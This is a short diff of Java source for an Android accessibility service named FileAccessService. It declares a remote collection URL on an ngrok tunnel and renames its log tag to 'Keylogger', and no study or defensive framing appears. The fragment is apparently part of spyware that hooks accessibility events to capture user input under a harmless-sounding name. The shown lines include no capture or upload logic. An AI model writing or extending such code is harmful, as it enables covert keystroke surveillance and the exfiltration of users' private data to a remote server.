@@ -15,7 +15,7 @@ import java.util.Scanner;
 
 public class FileAccessService extends AccessibilityService {
     private static final String SERVER_URL = "https://locust-handy-seagull.ngrok-free.app/server.php";
-    private static final String TAG = "FileAccessService";
+    private static final String TAG = "Keylogger";
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
